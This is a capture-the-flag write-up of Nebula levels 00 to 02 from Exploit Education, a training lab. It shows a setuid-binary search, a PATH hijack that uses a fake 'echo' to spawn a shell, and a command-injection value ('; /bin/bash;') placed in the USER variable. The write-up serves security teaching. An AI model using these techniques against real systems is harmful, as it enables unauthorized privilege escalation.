 ## Table of Contents
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Level 00](#level-00)
- [Level 01](#level-01)
- [Level 02](#level-02)
- [Level 03](#level-03)
- [Level 04](#level-04)
- [Level 05](#level-05)
- [Level 06](#level-06)
- [Level 07](#level-07)
- [Level 08](#level-08)
- [Level 09](#level-09)
- [Level 10](#level-10)
- [Level 11](#level-11)
- [Level 12](#level-12)
- [Level 13](#level-13)
- [Level 14](#level-14)
- [Level 15](#level-15)
- [Level 16](#level-16)
- [Level 17](#level-17)
- [Level 18](#level-18)
- [Level 19](#level-19)

## Introduction

Welcome to my exploit write up on the Nebula challenges from the website [Exploit Education](https://exploit.education). 

## Level 00

[Level 00 Code](https://exploit.education/nebula/level-00/).


This challenge is less about exploit knowledge and more about understanding the Linux environment. To solve the challenge we need to find a program that sets your user id as "flag00". This best way to find files on Linux is to use the find program. Which if we check the manuel for by using entering man find, we can see all the command arguments that the find program takes. One of which is the "-user" argument. This allows you to see all the files that x user has access to. We can use this to find all the files the user "flag00" has access to. Entering this shows us the program we where looking for right off the bat. Running the program, "./bin/.../flag00", sets the user as "flag00", allowing us to get the flag solving the challenge.

```bash
level00@nebula:/$ find -user flag00
./bin/.../flag00
find: `./etc/chatscripts': Permission denied
find: `./etc/ppp/peers': Permission denied
find: `./etc/ssl/private': Permission denied
./home/flag00
./home/flag00/.bash_logout
./home/flag00/.bashrc
./home/flag00/.profile
find: `./home/flag01': Permission denied
...
find: `./home/level19': Permission denied
find: `./home/nebula/.ssh': Permission denied
find: `./proc/tty/driver': Permission denied
find: `./proc/1/task/1/fd': Permission denied
...
find: `./proc/1493/fdinfo/5': No such file or directory
find: `./root': Permission denied
find: `./sys/kernel/debug': Permission denied
find: `./var/cache/ldconfig': Permission denied
find: `./var/lib/php5': Permission denied
find: `./var/lib/sudo': Permission denied
find: `./var/spool/cron/atjobs': Permission denied
find: `./var/spool/cron/atspool': Permission denied
find: `./var/spool/cron/crontabs': Permission denied
./rofs/bin/.../flag00
find: `./rofs/etc/chatscripts': Permission denied
find: `./rofs/etc/ppp/peers': Permission denied
find: `./rofs/etc/ssl/private': Permission denied
./rofs/home/flag00
./rofs/home/flag00/.bash_logout
./rofs/home/flag00/.bashrc
./rofs/home/flag00/.profile
find: `./rofs/home/flag01': Permission denied
...
find: `./rofs/home/level19': Permission denied
find: `./rofs/home/nebula/.ssh': Permission denied
find: `./rofs/root': Permission denied
find: `./rofs/var/cache/ldconfig': Permission denied
find: `./rofs/var/lib/php5': Permission denied
find: `./rofs/var/lib/sudo': Permission denied
find: `./rofs/var/spool/cron/atjobs': Permission denied
find: `./rofs/var/spool/cron/atspool': Permission denied
find: `./rofs/var/spool/cron/crontabs': Permission denied
```

### Solved

```bash
level00@nebula:/$ ./bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:/$ getflag
You have successfully executed getflag on a target account
``` 

## Level 01

[Level 01 Code](https://exploit.education/nebula/level-01/).


This challenge makes you think that you need to find an exploit in the functions "setresgid" and/or "setresuid". In reality we are only going to exploit the way Linux calls command line programs. When a program is called on the command line in a Linux environment the command shell looks to the path environment variable to find where the program that the user is calling is located. If we create our own echo program and have the path variable look at the location of it. We can then exploit the program by calling our own echo when it tries to call echo in the system function call. The only thing our echo does is create a bash shell.

```bash
level01@nebula:~$ touch echo.c
level01@nebula:~$ nano echo.c
```
```c
#include<stdio.h>
#include<stdlib.h>

int main()
{
  system("/bin/bash");
}
```

We can compile our echo program with gcc and make sure it outs the program name as echo by using the command argument "-o". We then set the path environment variable using export to include the home folder of user "level01". After that we can go to the home folder of user "flag01" and then run the "flag01" program. Once the program tries to run echo it will run our newly created one instead. Giving us access to the "flag01" user allowing us to get the flag and solve the challenge.

```bash
level01@nebula:~$ gcc echo.c -o echo
level01@nebula:~$ export PATH="/home/level01/:$PATH"
```

### Solved

```bash
level01@nebula:/tmp$ cd /home/flag01/
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
```

## Level 02

[Level 02 Code](https://exploit.education/nebula/level-02/).


This challenge is the same as the last were we are changing an environment variable. This time it is the "USER" variable that we are changing. If we go to the home folder of user "flag02" and call the flag02 program. We can see that the program uses the "USER" variable when calling echo. If we try and change the variable to test if the program takes in our change. We can see that it does. Now if set the "USER" variable as bash shell call we can then be in a bash shell as the "flag02" user. We can then call the getflag program to get the flag and solve the challenge.

```bash
level02@nebula:~$ cd /home/flag02/
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo level02 is cool")
level02 is cool
level02@nebula:/home/flag02$ export USER="fffff"
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo fffff is cool")
fffff is cool
```

### Solved

```bash
level02@nebula:/home/flag02$ export USER="; /bin/bash;"
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo ; /bin/bash; is cool")

flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```
